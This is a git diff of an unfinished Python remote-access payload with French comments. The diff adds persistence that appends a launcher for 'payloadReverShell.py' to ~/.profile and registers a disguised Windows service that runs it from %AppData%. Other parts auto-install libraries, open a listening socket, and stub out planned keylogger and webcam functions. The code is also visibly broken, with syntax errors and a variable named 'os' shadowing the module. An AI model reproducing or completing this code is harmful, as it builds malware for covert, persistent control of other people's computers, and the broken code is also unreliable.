@@ -6,6 +6,7 @@ import os
 
 ##variable
 os = 0
+message = str()
 #os.popen("sudo /usr/bin/pip3 install --upgrade typing")
 
 ##installation des lib nécéssaire au payload
@@ -44,19 +45,20 @@ except ImportError:
 'base64'])
 finally:
     import base64
+try:
+    from pathlib import Path
+except ImportError:
+    subprocess.check_call([sys.executable, '-m', 'pip3', 'install', 'pathlib'])
+finally:
+    from pathlib import Path
+try:
+    from SMWinservice import SMWinservice
+except ImportError:
+    subprocess.check_call([sys.executable, '-m', 'pip3', 'install', 'pathlib'])
+finally:
+    from SMWinservice import SMWinservice
 
 
-"""
-
-from pathlib import Path
-from SMWinservice import SMWinservice
-"""
-
-
-
-message = str()
-#### Client ######
-###Def fonction####
 
 ## Création du fichier
 def createProgramme():
@@ -68,6 +70,12 @@ def createProgramme():
 
     new_file= new_name+".py"
     process = subprocess.Popen(["python", new_file], shell=False)
+
+
+#### Client ######
+###Def fonction####
+
+
 
 ##Def detection os
 def detectos():
@@ -113,9 +121,8 @@ def persistant():
         cmd = "echo  \n 'if [ -r payloadReverShell\.py] ; then' \n \v 'python3 payloadReverShell\.py' \n 'fi'  >> ~/.profile "
     elif os == 2
 
-        os.walk()
-
-
+        os.walk("%AppData%")
+        createProgramme()
         class PythonCornerExample(SMWinservice):
             _svc_name_ = "PythonCornerExample"
             _svc_display_name_ = "Python Corner's Winservice Example"
@@ -129,16 +136,12 @@ def persistant():
 
             def main(self):
                 self.isrunning:
-                os.walk()
-                startpayload = "python payloadReverShell.py"
-                process = subprocess.Popen(startpayload, shell=True, stdout=subprocess.PIPE,stderr=subprocess.PIPE)
 
+                startpayload = "python3 %AppData%/payloadReverShell.py"
+                process = subprocess.Popen(startpayload, shell=True, stdout=subprocess.PIPE,stderr=subprocess.PIPE)
 
             if __name__ == '__main__':
                 PythonCornerExample.parse_command_line()
-
-
-
             return
 ##def  Keylogger():
 ##def webcam():
@@ -153,6 +156,8 @@ def persistant():
 ##def privilege():
 ##def logs():
 
+
+##Coder le multithearding
 
 ##Attendre une connexion
 mon_socket = s.socket(s.AF_INET,s.SOCK_STREAM)
